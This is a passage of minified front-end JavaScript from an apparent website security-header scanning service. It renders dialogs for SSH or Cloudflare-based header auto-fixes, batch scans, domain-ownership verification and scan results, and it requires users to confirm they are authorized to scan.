验证头<br>",t+="<b>失败回滚</b>：如 nginx -t 失败，自动停止不会 reload<br>",t+="<b>零停机</b>：用 reload 而非 restart",t+="</div>",t+='<div style="margin-bottom:14px">',t+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:8px">修复方式</label>',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">',t+='<label style="background:var(--bg);border:2px solid var(--primary);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-ssh">',t+='<input type="radio" name="auto-fix-method" value="ssh" checked style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">SSH</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">SSH 登录服务器</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">需服务器 SSH 账号</div>',t+="</label>",t+='<label style="background:var(--bg);border:2px solid var(--border);border-radius:2px;padding:10px;cursor:pointer;text-align:center" id="opt-cf">',t+='<input type="radio" name="auto-fix-method" value="cloudflare" style="display:none">',t+='<div style="font-size:20px;color:var(--text-secondary)">CF</div>',t+='<div style="font-size:12px;font-weight:600;margin-top:4px">Cloudflare API</div>',t+='<div style="font-size:11px;color:var(--text-secondary)">只需 API 令牌</div>',t+="</label>",t+="</div>",t+="</div>",t+='<div id="ssh-form">',t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">服务器 IP/域名</label><input id="af-host" type="text" placeholder="192.168.1.100" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 端口</label><input id="af-port" type="number" value="22" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">',t+='<div><label style="font-size:12px;color:var(--text-secondary)">SSH 用户名</label><input id="af-user" type="text" value="root" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div><label style="font-size:12px;color:var(--text-secondary)">平台</label><select id="af-platform" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"><option value="nginx">Nginx</option><option value="apache">Apache</option></select></div>',t+="</div>",t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">SSH 密码 <span style="color:#c75450">*（仅本次使用，不保存）</span></label><input id="af-pass" type="password" placeholder="••••••" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+='<div id="cf-form" style="display:none">',t+='<div style="margin-bottom:8px"><label style="font-size:12px;color:var(--text-secondary)">Cloudflare API 令牌</label><input id="af-cf-token" type="password" placeholder="Cloudflare 令牌" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+='<div style="margin-bottom:12px"><label style="font-size:12px;color:var(--text-secondary)">Zone（域名，如 example.com）</label><input id="af-cf-zone" type="text" placeholder="示例.com" style="width:100%;padding:8px;border:1px solid var(--border);border-radius:2px;background:var(--bg);color:var(--text);font-size:12px"></div>',t+="</div>",t+=`<button onclick="executeAutoFix('`+e+`')" style="width:100%;background:#73c990;color:#fff;border:none;padding:12px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600;margin-top:8px">生成修复配置并复测</button>`,t+='<div id="af-result" style="margin-top:14px"></div>',t+="</div></div>";let s=document.createElement("div");s.id="auto-fix-dialog",s.innerHTML=t,document.body.appendChild(s),setTimeout(function(){document.querySelectorAll('input[name="auto-fix-method"]').forEach(function(o){o.addEventListener("change",function(){let a=document.getElementById("ssh-form"),n=document.getElementById("cf-form"),c=document.getElementById("opt-ssh"),p=document.getElementById("opt-cf");this.value==="ssh"?(a.style.display="block",n.style.display="none",c.style.borderColor="var(--primary)",p.style.borderColor="var(--border)"):(a.style.display="none",n.style.display="block",c.style.borderColor="var(--border)",p.style.borderColor="var(--primary)")})})},50)}catch(t){console.error("showAutoFixDialog error:",t),M("打开修复配置对话框失败: "+(t.message||String(t)),"error")}}function as(){let e=document.getElementById("auto-fix-dialog");e&&e.remove()}async function ls(e){let i=document.querySelector('input[name="auto-fix-method"]:checked');if(!i){M("请选择修复方式","error");return}let t=i.value,s=document.getElementById("af-result");if(s){s.innerHTML='<div style="background:var(--bg);border-radius:2px;padding:12px;font-size:12px;color:var(--text-secondary)">正在连接服务器并执行修复，请稍候...</div>';try{let r={scan_id:e};if(t==="ssh"){if(r.credentials={host:document.getElementById("af-host").value.trim(),port:parseInt(document.getElementById("af-port").value)||22,username:document.getElementById("af-user").value.trim()||"root",password:document.getElementById("af-pass").value,platform:document.getElementById("af-platform").value},!r.credentials.host||!r.credentials.password){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写服务器 IP 和密码</div>';return}}else if(r.cf_token=document.getElementById("af-cf-token").value.trim(),r.cf_zone=document.getElementById("af-cf-zone").value.trim(),!r.cf_token||!r.cf_zone){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px;color:#c75450">错误：请填写 CF 令牌 和 Zone</div>';return}let a=await ue(t==="ssh"?"/api/auto-fix":"/api/auto-fix-via-cloudflare",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)}),n=await a.json();if(!a.ok||!n.success){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px"><b>修复失败</b><br><pre style="margin:6px 0 0;font-size:12px;white-space:pre-wrap">'+E(JSON.stringify(n,null,2))+"</pre></div>";return}let c='<div style="background:rgba(16,185,129,0.1);border:1px solid #73c990;border-radius:2px;padding:12px">';c+='<div style="font-size:14px;font-weight:600;color:#73c990;margin-bottom:8px">修复成功</div>',n.host&&(c+='<div style="font-size:12px;color:var(--text-secondary)">服务器: '+E(n.host)+"</div>"),n.config_path&&(c+='<div style="font-size:12px;color:var(--text-secondary)">配置: '+E(n.config_path)+" ("+n.patch_size_bytes+" 字节)</div>"),n.config_test_ok!==void 0&&(c+='<div style="font-size:12px;color:'+(n.config_test_ok?"#73c990":"#c75450")+'">nginx -t: '+(n.config_test_ok?"配置合法":"配置错误，已停止 reload")+"</div>"),n.verified_headers&&n.verified_headers.length>0&&(c+='<div style="font-size:12px;font-weight:600;margin-top:8px">已验证的安全头：</div>',n.verified_headers.slice(0,6).forEach(function(p){c+='<div style="font-size:11px;font-family:monospace;background:#0f172a;color:#73c990;padding:4px;border-radius:3px;margin-top:2px">'+E(p)+"</div>"})),n.applied!==void 0&&(c+='<div style="font-size:12px;margin-top:8px">Cloudflare: '+n.applied+"/"+n.total+" 头已应用</div>"),c+='<button onclick="closeAutoFixDialog();loadHistory&&loadHistory()" style="width:100%;margin-top:10px;background:var(--primary);color:#fff;border:none;padding:8px;border-radius:2px;cursor:pointer;font-size:12px">完成</button>',c+="</div>",s.innerHTML=c,M("修复配置已应用。已验证 "+(n.verified_headers?n.verified_headers.length:0)+" 个安全头")}catch(r){s.innerHTML='<div style="background:#3c3f41;border:1px solid #c75450;border-radius:2px;padding:12px;font-size:12px">错误：网络错误: '+E(r.message||String(r))+"</div>"}}}function ds(){if(!ve()&&!isPublicDemoTarget(url)){M("请先登录"),Se("profile");return}let e=document.getElementById("batch-scan-modal");e&&(e.style.display="flex");let i=document.getElementById("batch-results");i&&(i.innerHTML="")}function cs(){let e=document.getElementById("batch-scan-modal");e&&(e.style.display="none")}async function ps(){let e=(document.getElementById("batch-urls").value||"").trim();if(!e){M("请输入至少 1 个 URL");return}let i=e.split(/\r?\n/).map(function(n){return n.trim()}).filter(Boolean);if(i.length>5){M("最多 5 个 URL");return}let t=document.getElementById("batch-auth-check");if(!t||!t.checked){M("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}let s=document.getElementById("batch-deep"),r=s?s.checked:!1,o=document.getElementById("batch-go-btn");o&&(o.disabled=!0,o.textContent="扫描中…");let a=document.getElementById("batch-results");if(!a){o&&(o.disabled=!1,o.textContent="开始批量扫描");return}a.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary);font-size:13px">正在扫描 '+i.length+" 个目标…</div>";try{let n=await ue("/api/batch-scan",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({urls:i,deep:r,authorized:!!(t&&t.checked)})}),c=await n.json();if(!n.ok){a.innerHTML='<div style="color:#c75450;padding:10px">错误：'+E(mt(De(c)))+"</div>";return}let p='<div style="font-size:13px;font-weight:600;margin-bottom:8px">扫描完成 · '+c.count+" 个目标</div>";c.results.forEach(function(v,d){let f=v.ok?v.score>=80?"#73c990":v.score>=50?"#f0a732":"#c75450":"#808080",h=v.ok?v.score>=80?"rgba(16,185,129,0.1)":v.score>=50?"rgba(240,167,50,0.1)":"rgba(199,84,80,0.1)":"rgba(156,163,175,0.1)";p+='<div style="background:'+h+';border-radius:2px;padding:10px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;gap:10px">',p+='<div style="flex:1;min-width:0">',p+='<div style="font-size:12px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+(d+1)+". "+v.url+"</div>",v.ok?p+='<div style="font-size:12px;color:var(--text-secondary);margin-top:3px">高 '+v.high+" · 中 "+v.medium+" · 低 "+v.low+"</div>":p+='<div style="font-size:12px;color:#c75450;margin-top:3px">错误：'+(v.error||"失败")+"</div>",p+="</div>",v.ok?p+='<div style="font-size:20px;font-weight:700;color:'+f+'">'+v.score+"</div>":p+='<div style="font-size:12px;color:#808080">无评分</div>',p+="</div>"}),a.innerHTML=p,M("批量体检完成")}catch(n){a.innerHTML='<div style="color:#c75450;padding:10px">网络错误：'+(n.message||n)+"</div>"}finally{o&&(o.disabled=!1,o.textContent="开始批量体检")}}function yi(e){try{let i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t){M("请输入目标网址");return}let s=document.getElementById("auth-check-step1");if(!s||!s.checked){M("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}try{let a=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",a),ve()&&ue("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:a})}).catch(function(){})}catch{}if(/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),!ve()){M("请先登录"),Se("profile");return}let r=document.getElementById("auth-check");if(s&&r&&s.checked){r.checked=!0;let a=document.getElementById("scan-btn");a&&(a.disabled=!1)}let o=document.getElementById("scan-url-confirmed");o&&(o.value=t),gt(),bi()}catch(i){console.error("startScanDirect error:",i),ye=!1,pe("scan-btn",!1),pe("scan-btn-step1",!1),M("启动失败："+(i.message||String(i)))}}function lt(){let e=document.getElementById("scan-url"),t=!!(e?e.value.trim():""),s=document.getElementById("auth-check-step1"),r=document.getElementById("auth-check"),o=document.getElementById("scan-btn-step1"),a=document.getElementById("scan-btn"),n=t&&ve(),c=t&&!!(r&&r.checked);o&&(o.disabled=!n),a&&(a.disabled=!c),s&&s.checked&&o&&o.disabled&&(o.disabled=!1)}function gt(){try{lt()}catch{}setTimeout(function(){try{lt()}catch{}},100),setTimeout(function(){try{lt()}catch{}},500)}function us(e){let i=document.getElementById(e);if(!i)return;let t=i.value,s=document.getElementById(e+"-btn"),r=s?s.textContent:"",o=function(){s&&(s.textContent="已复制",s.style.background="rgba(115,201,144,0.2)",s.style.color="#16a34a",s.style.borderColor="rgba(115,201,144,0.4)",setTimeout(function(){s.textContent=r,s.style.background="rgba(75,110,175,0.1)",s.style.color="#4f46e5",s.style.borderColor="rgba(75,110,175,0.3)"},1500))};if(navigator.clipboard&&window.isSecureContext)navigator.clipboard.writeText(t).then(o).catch(function(){i.select(),document.execCommand("copy"),o()});else{i.select();try{document.execCommand("copy"),o()}catch{M("复制失败，请手动选择")}}}function fs(e){try{if(!ve()){M("请先登录后再使用"),Se("profile");return}let i=document.getElementById("scan-url");i&&(i.value=e);let t=document.getElementById("auth-check-step1");t&&!t.checked&&(t.checked=!0,t.dispatchEvent(new Event("change")));try{let s=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",s),ue("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:s})}).catch(function(){})}catch{}yi()}catch(i){console.error("quickDemo error:",i),M("启动未完成："+(i.message||String(i)),"error")}}function gs(){window._publicReportResult&&bt(window._publicReportResult)}function hs(){let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){M("请输入目标网址");return}/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i));try{let v=new URL(i).hostname.toLowerCase();if(!v){M("网址格式不正确，请输入完整域名（如 example.com）");return}let d=/^(\d{1,3}\.){3}\d{1,3}$/.test(v)||v.indexOf(":")>=0,f=v==="localhost",h=v.indexOf(".")>=0;if(!d&&!f&&!h){M("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{M("网址格式不正确，请输入有效的 URL");return}vt="vs-"+Math.random().toString(36).substring(2,10)+"-"+Date.now().toString(36);let t=et(i),s=document.getElementById("verify-token"),r=document.getElementById("dns-record"),o=document.getElementById("verify-step-1"),a=document.getElementById("verify-step-2"),n=document.getElementById("verify-method-info"),c=document.getElementById("verify-confirm-btn");s&&(s.textContent=vt),r&&(r.textContent="_vuln-sentinel."+t+' TXT "'+vt+'"'),o&&(o.style.display="none"),a&&(a.style.display="block"),Dt="",n&&(n.innerHTML="<p>请选择一种验证方式</p>"),c&&(c.disabled=!0)}function vs(e,i){Dt=i,document.querySelectorAll(".verify-method").forEach(function(r){r.classList.remove("selected")}),e&&e.classList.add("selected");let t=document.getElementById("verify-method-info");t&&(i==="dns"?t.innerHTML="<p>已选择 DNS TXT 验证。请在域名 DNS 管理中添加 TXT 记录后点击确认。</p>":t.innerHTML="<p>已选择网站文件验证。请在网站根目录创建验证文件后点击确认。</p>");let s=document.getElementById("verify-confirm-btn");s&&(s.disabled=!1)}function ms(){if(!ve()){M("请先登录"),Se("profile");return}let e=document.getElementById("scan-url"),i=e?e.value.trim():"";if(!i){M("请输入目标网址");return}if(/^https?:\/\//i.test(i)||(i="https://"+i,e&&(e.value=i)),!confirm(`跳过域名归属验证将直接进入扫描阶段。该选项仅适用于您已确认拥有该目标网站或正在测试环境使用的场景。

继续吗？`))return;let t=document.getElementById("scan-url-confirmed");t&&(t.value=i);let s=document.getElementById("auth-check");s&&(s.checked=!0),lt();let r=document.getElementById("verify-step-2"),o=document.getElementById("verify-step-3");r&&(r.style.display="none"),o&&(o.style.display="block"),M("已跳过验证，进入快速扫描")}function ys(){if(!Dt){M("请先选择验证方式");return}if(!ve()){M("请先登录"),Se("profile");return}let e=document.getElementById("verify-confirm-btn"),i=document.getElementById("scan-url"),t=i?i.value.trim():"";if(!t&&urlOverride&&(t=String(urlOverride).trim(),i&&(i.value=t)),!t){M("请输入目标网址");return}/^https?:\/\//i.test(t)||(t="https://"+t,i&&(i.value=t)),e&&(e.disabled=!0,e.textContent="正在查询 DNS / 下载验证文件..."),ue("/api/verify",{method:"POST",body:JSON.stringify({url:t,token:vt,method:Dt})}).then(function(s){return s.json()}).then(function(s){if(e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),s.success){let r=document.getElementById("scan-url-confirmed");r&&(r.value=t);let o=document.getElementById("auth-check");o&&(o.checked=!0);try{lt()}catch{}let a=document.getElementById("verify-step-2"),n=document.getElementById("verify-step-3");a&&(a.style.display="none"),n&&(n.style.display="block"),M("验证通过："+(s.message||""))}else{M("验证失败："+(s.message||"未找到验证信息"),"error");let r=document.getElementById("verify-method-info");r&&(r.innerHTML='<p style="color:var(--danger)">'+E(s.message||"验证失败")+"</p>")}}).catch(function(s){e&&(e.disabled=!1,e.textContent="我已添加验证信息，确认验证"),M("验证请求失败："+s.message,"error")})}function bs(){yt(vt),M("令牌 已复制")}function xs(e,i,t){let s=100;return e.forEach(function(r){r.level==="高风险"?s-=18:r.level==="中风险"?s-=10:r.level==="低风险"&&(s-=4)}),i&&(s+=12),t&&(s+=10),Math.max(10,Math.min(98,s))}function bi(){try{if(ye){M("扫描进行中，请稍候");return}if(!ve()&&!isPublicDemoTarget(r)){M("请先登录后再使用扫描功能"),Se("profile");return}ye=!0,pe("scan-btn",!0),pe("scan-btn-step1",!0);let e=document.getElementById("auth-check"),i=document.getElementById("auth-check-step1"),t=e&&e.checked||i&&i.checked||!1;if(!t){ye=!1,pe("scan-btn",!1),pe("scan-btn-step1",!1),M("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}e&&!e.checked&&(e.checked=!0);try{let d=new Date().toISOString();localStorage.setItem("vs_auth_checked_at",d),ue("/api/scan-auth-log",{method:"POST",body:JSON.stringify({authorized_at:d})}).catch(function(){})}catch{}let s=document.getElementById("scan-url-confirmed"),r=s?s.value.trim():"";if(!r){let d=document.getElementById("scan-url");r=d?d.value.trim():"",r&&s&&(s.value=r)}if(!r){ye=!1,pe("scan-btn",!1),M("请输入有效网址");return}/^https?:\/\//i.test(r)||(r="https://"+r);try{let f=new URL(r).hostname.toLowerCase();if(!f){ye=!1,pe("scan-btn",!1),M("网址格式不正确，请输入完整域名（如 example.com）");return}let h=/^(\d{1,3}\.){3}\d{1,3}$/.test(f)||f.indexOf(":")>=0,m=f==="localhost",g=f.indexOf(".")>=0;if(!h&&!m&&!g){ye=!1,pe("scan-btn",!1),M("网址格式不正确，请输入完整域名（如 example.com）或 IP 地址");return}}catch{ye=!1,pe("scan-btn",!1),M("网址格式不正确，请输入有效的 URL");return}let o=et(r);Se("result");let a='<div class="report-header fade-in-up"><div style="font-size:48px;margin-bottom:16px"></div><h2 style="margin-bottom:8px;font-size:clamp(16px,5vw,22px)">正在扫描 '+E(o)+`</h2><p style="color:var(--text-lighter);font-size:13px;margin-bottom:20px">安全扫描引擎正在执行目标扫描...</p><div style="max-width:min(320px,90vw);margin:0 auto 20px;background:rgba(255,255,255,0.1);border-radius:2px;height:8px;overflow:hidden"><div id="scan-progress-bar" style="height:100%;background:linear-gradient(90deg,#4b6eaf,#818cf8);width:5%;border-radius:2px;transition:width 0.3s"></div></div><div id="scan-progress-text" style="font-size:12px;color:var(--text-lighter)">正在初始化扫描引擎...</div><button onclick="cancelScan()" style="margin-top:20px;padding:10px 24px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;cursor:pointer;font-size:13px;font-weight:500;transition:background 0.15s" onmouseover="this.style.background='rgba(199,84,80,0.25)'" onmouseout="this.style.background='rgba(199,84,80,0.15)'"> 取消扫描</button></div>`,n=document.getElementById("result-content");n&&(n.innerHTML=a);let c=document.querySelector('input[name="scan-depth"]:checked'),v=(c&&c.value||"standard")==="deep";gn(r,o,v,t)}catch(e){console.error("startScan error:",e),ye=!1,pe("scan-btn",!1),pe("scan-btn-step1",!1);let i=document.getElementById("result-content");i?i.innerHTML='<div class="card" style="text-align:center;padding:40px 20px"><div style="font-size:48px;margin-bottom:12px">错误：</div><h3 style="color:var(--danger);margin-bottom:8px">启动失败</h3><p style="color:var(--text-secondary);font-size:13px;margin-bottom:16px">页面在启动扫描时遇到问题。</p><p style="color:var(--text-lighter);font-size:12px;margin-bottom:16px">错误信息：'+E(e.message||String(e))+`</p><button class="btn btn-primary" onclick="navigateTo('home')"> 返回首页</button></div>`:M("启动失败："+(e.message||String(e)),"error")}}function ws(){ye&&(Te=!0,ye=!1,pe("scan-btn",!1),typeof He=="function"&&He(),typeof ai=="function"&&ai(),M("扫描已取消"),setTimeout(function(){Se("home"),Te=!1},300))}function gn(e,i,t,s){hn();let o=setTimeout(function(){Te||(He(),setTimeout(function(){Te||(ht("扫描超时，目标网站可能响应缓慢或无法访问。请检查网址是否正确，或稍后重试。",e),ye=!1,pe("scan-btn",!1),pe("scan-btn-step1",!1),pe("scan-btn-step1",!1))},600))},t?12e4:6e4);ue("/api/scan",{method:"POST",body:JSON.stringify({url:e,depth:t?"deep":"standard",authorized:!!s})}).then(function(a){if(!Te)return clearTimeout(o),a.json().then(function(n){return n._status=a.status,n}).catch(function(){throw new Error("服务器返回异常（HTTP "+a.status+"），请稍后重试")})}).then(function(a){if(!Te){if(clearTimeout(o),Zt(a)){He(),setTimeout(function(){if(Te)return;M(Ht(a),"error");let n=document.getElementById("result-content");n&&(n.innerHTML='<div class="card" style="text-align:center;padding:36px 20px"><div style="font-size:44px;margin-bottom:12px">额度不足</div><h3 style="margin:0 0 8px;color:var(--warning)">当前额度不够继续扫描</h3><p style="color:var(--text-secondary);font-size:13px;line-height:1.7;margin:0 0 16px">'+E(Ht(a))+`</p><button class="btn btn-primary" onclick="navigateTo('billing')">去充值</button> <button class="btn btn-secondary" onclick="navigateTo('profile')">查看额度</button></div>`),Re(),ye=!1,pe("scan-btn",!1)},600);return}if(a._status&&a._status>=400){He(),setTimeout(function(){if(Te)return;let n=De(a);a._status===403?n=n+`

如需扫描自有域名，请先完成域名归属验证；如果只是体验功能，请改用 example.com、httpbin.org 等公开演示站点。`:a._status===429&&(n="扫描请求过于频繁，请等待 1 分钟后重试。"),ht(n,e),ye=!1,pe("scan-btn",!1)},600);return}if(a.error){He(),setTimeout(function(){Te||(ht(De(a),e),ye=!1,pe("scan-btn",!1))},600);return}He(),setTimeout(function(){if(Te)return;let n=ks(e,a);de=n,wn(),bt(n),ye=!1,pe("scan-btn",!1),pe("scan-btn-step1",!1),Re()},400)}}).catch(function(a){Te||(clearTimeout(o),He(),setTimeout(function(){if(Te)return;let n=a&&a.message?a.message:"扫描服务连接失败，请检查网络或稍后重试";ht(n,e),ye=!1,pe("scan-btn",!1),pe("scan-btn-step1",!1)},600))})}function ks(e,i){let t=et(e);i=i||{};let s=Array.isArray(i.findings)?i.findings:[];s.forEach(function(n){if(n.severity&&!n.level_zh){let c={high:"高风险",medium:"中风险",low:"低风险",critical:"严重"};n.level_zh=c[n.severity]||"低风险",n.level=n.level_zh}});let r=i.score,o=i.risk_level,a={summary:"对 "+t+" 的真实安全扫描已完成。共发现 "+s.length+" 个安全问题，综合安全评分为 "+r+" 分（满分 100）。",priority:s.length>0?'优先修复标记为"高风险"的安全问题。':"安全状况良好，建议持续监控。",boundary:"本次检测基于真实 HTTP 响应头判断。"};return{url:e,time:new Date().toLocaleString("zh-CN"),score:r,risk_level:o,scan_mode:"real",scan_id:i.scan_id||null,ai_report:a,owasp_coverage:i.owasp_coverage||[],findings:s,header_details:i.header_details||[],info_leaks:i.info_leaks||[],cors:i.cors||null,cookie_issues:i.cookie_issues||[],raw_headers:i.raw_headers||{},is_https:i.is_https!==!1,restricted:i.restricted||!1,restricted_reason:i.restricted_reason||"",restricted_code:i.restricted_code||"",redirected:i.redirected||!1,redirect_reason:i.redirect_reason||"",headers:i.headers||i.raw_headers||{},waf:i.waf||(i.waf_list&&i.waf_list[0]?i.waf_list[0].name:null),ssl:i.ssl||i.ssl_info||{},duration_ms:i.duration_ms||0,report_share_id:i.report_share_id||null,discovered_at:s.length>0&&s[0].discovered_at?s[0].discovered_at:new Date().toISOString()}}function ht(e,i){let t=document.getElementById("result-content");if(!t){setTimeout(function(){ht(e,i)},0);return}let s=E(i),r=/login|redirect|spm|havana|sso|auth|signin/i.test(i),o=i.length>80,a="";try{let h=new URL(i);a=h.protocol+"//"+h.hostname}catch{}let n=e&&(e.indexOf("无法解析")!==-1||e.indexOf("DNS")!==-1);if(e&&e.indexOf("超时"),e&&e.indexOf("无法连接"),e&&(e.indexOf("域名归属验证")!==-1||e.indexOf("域名验证")!==-1)){let h='<div class="card" style="padding:24px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.3);border-radius:2px;text-align:center;max-width:600px;margin:0 auto;">';h+='<div style="font-size:14px;font-weight:600;color:#4b6eaf;margin-bottom:12px">安全登录</div>',h+='<h3 style="margin:0 0 8px;color:#4b6eaf">深度扫描需要域名归属验证</h3>',h+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:14px;line-height:1.6">'+E(e)+"</p>",h+='<p style="color:var(--text-secondary);margin:0 0 20px;font-size:13px">为了符合安全要求，深度扫描（爬虫 + 漏洞探测）需要先证明您拥有该域名。</p>',h+='<div style="display:flex;gap:12px;justify-content:center;flex-wrap:wrap">',h+=`<button onclick="document.getElementById('scan-url').value='`+s+`'; goVerifyStep2();" class="btn-primary" style="padding:10px 20px;border-radius:2px;border:none;background:#4b6eaf;color:white;cursor:pointer;font-size:14px">立即验证域名</button>`,h+=`<button onclick="startScanDirect('`+s+`', false)" class="btn-secondary" style="padding:10px 20px;border-radius:2px;border:1px solid var(--border);background:transparent;color:var(--text-primary);cursor:pointer;font-size:14px">改用普通扫描</button>`,h+="</div></div>",t.innerHTML=h;return}let p="扫描未完成",v=e,d=["&#x2022; 目标站点可能拒绝自动化请求（反爬机制）","&#x2022; 目标需要登录或身份认证","&#x2022; 当前 URL 是跳转/登录链接，不是主站","&#x2022; 网站设置了访问限制（如 IP 黑名单）","&#x2022; 网站已下线或服务器故障"];n&&(p="域名无法解析",d=["&#x2022; 网址拼写错误，或域名尚未注册","&#x2022; DNS 服务器暂时无法解析","&#x2022; 本地网络 DNS 配置问题"]);let f='<div class="report-header fade-in-up">';f+='<div style="margin-bottom:12px">',f+='<span style="display:inline-flex;align-items:center;gap:4px;background:rgba(199,84,80,0.15);color:#c75450;border:1px solid rgba(199,84,80,0.3);border-radius:2px;padding:4px 12px;font-size:12px;font-weight:700">扫描未完成</span>',f+="</div>",f+='<div class="score-ring-wrap">',f+='<div class="score-ring" style="background:#3c3f41">',f+='<div class="score-value" style="color:#fff">--</div>',f+='<div class="score-label" style="color:rgba(255,255,255,0.7)">无法评分</div>',f+="</div></div>",f+='<div class="report-url">'+s+"</div>",f+='<div class="report-time">'+new Date().toLocaleString("zh-CN")+"</div>",f+='<span class="risk-badge high">未完成</span>',f+="</div>",f+='<div class="card fade-in-up" style="animation-delay:0.1s;text-align:center;padding:40px 20px">',f+='<div style="font-size:48px;margin-bottom:16px"></div>',f+='<h3 style="margin-bottom:12px;color:var(--danger)">'+p+"</h3>",f+='<p style="color:var(--text-light);margin-bottom:20px;max-width:400px;margin-left:auto;margin-right:auto">'+E(v)+"</p>",(r||o)&&(f+='<div style="background:rgba(240,167,50,0.1);border:1px solid rgba(240,167,50,0.3);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2;margin-bottom:16px">',f+="<p><strong>提示： 检测到登录/跳转长链接</strong></p>",f+="<p>建议扫描网站主域名，而不是登录页或跳转链接。</p>",a&&(f+='<div style="margin-top:10px;text-align:center">',f+=`<button class="btn btn-primary" onclick="retryScanWithUrl('`+E(a)+`')" style="font-size:13px"> 改扫主域名：`+E(a)+"</button>",f+="</div>"),f+="</div>"),f+='<div style="background:var(--bg);border-radius:var(--radius-sm);padding:16px;text-align:left;font-size:13px;color:var(--text-secondary);line-height:2">',f+="<p><strong>可能的原因：</strong></p>",d.forEach(function(h){f+="<p>"+h+"</p>"}),f+="</div>",f+='<div style="margin-top:20px;text-align:left;border-top:1px solid var(--border);padding-top:20px">',f+='<label style="font-size:13px;font-weight:600;display:block;margin-bottom:6px">修改网址重新扫描：</label>',f+='<div style="display:flex;gap:8px">',f+='<input id="retry-url-input" type="url" value="'+s+'" style="flex:1;padding:10px 14px;border:2px solid var(--border);border-radius:2px;font-size:14px;outline:none" />',f+='<button class="btn btn-primary" onclick="retryScan()" style="white-space:nowrap"> 重试</button>',f+="</div>",f+='<div style="margin-top:12px;text-align:center">',f+='<button onclick="backToScanInput()" style="background:none;border:none;color:var(--primary);font-size:13px;cursor:pointer"><- 返回修改网址</button>',f+="</div></div>",f+="</div>",t.innerHTML=f,Se("result")}function _s(e){ye=!1,pe("scan-btn",!1);let i=document.getElementById("scan-url");i&&(i.value=e),bi()}function Ss(){ye=!1,pe("scan-btn",!1);let e=document.getElementById("verify-step-1"),i=document.getElementById("verify-step-2"),t=document.getElementById("verify-step-3");e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none");let s=document.getElementById("result-content");s&&(s.innerHTML=""),Se("scan")}function Es(){ye=!1,pe("scan-btn",!1);let e=document.getElementById("retry-url-input");if(!e)return;let i=e.value.trim();if(!i){M("请输入有效网址");return}let t=document.getElementById("auth-check");if(!t||!t.checked){M("请确认你拥有该域名或已获得授权。未经授权的安全扫描可能违反法律法规。");return}/^https?:\/\//i.test(i)||(i="https://"+i),e.value=i;let s=et(i),r=document.getElementById("result-content");if(!r)return;let a=[{id:"dns",label:"DNS 解析",detail:s},{id:"connect",label:"TCP 连接",detail:"443/80 端口"},{id:"headers",label:"响应头判断",detail:"9 项安全头"},{id:"ssl",label:"SSL 证书检查",detail:"证书链/有效期"},{id:"sensitive",label:"敏感路径扫描",detail:"12 个路径"},{id:"waf",label:"WAF 识别",detail:"6 类厂商指纹"},{id:"report",label:"报告",detail:"评分/建议"}].map(function(v,d){return'<div id="stage-'+v.id+'" class="scan-stage" style="display:flex;align-items:center;gap:10px;padding:10px 12px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.06);border-radius:2px;margin-bottom:6px;opacity:0.4;transition:all 0.3s"><div class="stage-icon" style="width:24px;height:24px;border-radius:50%;background:rgba(75,110,175,0.15);display:flex;align-items:center;justify-content:center;font-size:12px;color:#a5b4fc">...</div><div style="flex:1"><div style="font-size:13px;font-weight:600">'+v.label+'</div><div style="font-size:11px;color:var(--text-secondary)">'+v.detail+'</div></div><div 